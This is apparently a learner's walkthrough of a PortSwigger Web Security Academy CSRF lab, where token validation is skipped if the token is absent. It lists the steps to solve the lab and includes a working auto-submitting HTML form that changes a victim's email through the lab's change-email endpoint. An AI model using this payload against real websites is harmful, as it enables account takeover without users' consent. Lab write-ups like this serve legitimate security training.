https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present


This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter




1) log in as wiener:peter and go to /my-account and change the email
2) go on zap and try to resend the POST request removing the csrf and changing another time the email 
3) it is allowed and works
4) craft a html piece of code that submits a POST request to /change-email without the csrf token and send it to the victim



we need to send a request without the csrf token, because if it is not present then it is not verified
<html>
    <body>

        <form action="https://****************LAB-ID****************.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="exploit@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
